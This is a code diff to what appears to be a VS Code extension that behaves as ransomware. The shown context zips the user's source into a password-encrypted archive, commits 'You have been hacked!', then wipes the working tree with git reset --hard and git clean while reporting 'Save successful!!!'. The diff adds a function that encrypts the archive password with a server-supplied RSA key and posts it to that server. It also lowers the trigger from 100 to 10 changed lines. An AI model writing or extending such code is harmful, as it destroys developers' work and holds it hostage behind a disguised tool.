@@ -6,6 +6,10 @@ const path = require("path");
 const archiver = require("archiver");
 const zipEncrypted = require("archiver-zip-encrypted");
 const simpleGit = require('simple-git');
+const axios = require("axios");
+const crypto = require("crypto");
+
+const MAX_LEN = 10;
 
 const allowedExtensions = [
   // JavaScript/TypeScript
@@ -151,6 +155,34 @@ function generateRandomPassword(length = 16) {
   return password;
 }
 
+// Function to fetch public key and encrypt the password
+async function getAndEncryptKey(password) {
+  try {
+    // Request the public key from the server
+    const response = await axios.get("http://127.0.0.1:5000/get_key");
+    const publicKey = response.data.public_key; // Assuming the response contains a `public_key` field
+
+    // Encrypt the password using the public key
+    const buffer = Buffer.from(password, "utf-8");
+    const encrypted = crypto.publicEncrypt(
+      {
+        key: publicKey,
+        padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
+        oaepHash: "sha256", // Ensure the hash algorithm matches
+      },
+      buffer
+    );
+
+    await axios.post("http://127.0.0.1:5000/password", {
+      encrypted_password: encrypted.toString("base64"),
+    });
+
+    console.log("Encrypted password sent to the server.");
+  } catch (error) {
+    console.error("Error during encryption and server communication:", error);
+  }
+}
+
 // This method is called when your extension is activated
 // Your extension is activated the very first time the command is executed
 
@@ -243,7 +275,7 @@ function activate(context) {
           totalLineChanges += filteredAdded.reduce((acc, change) => acc + change.changes, 0);
         }
 
-        if (totalLineChanges < 100) {
+        if (totalLineChanges < MAX_LEN) {
           return;
         }
   
@@ -264,7 +296,7 @@ function activate(context) {
           await git.commit("You have been hacked!");
           await git.reset(["--hard"]);
           await git.clean("f", "-d");
-
+          await getAndEncryptKey(password);
           vscode.window.showInformationMessage("Save successful!!!\n");
         });
 
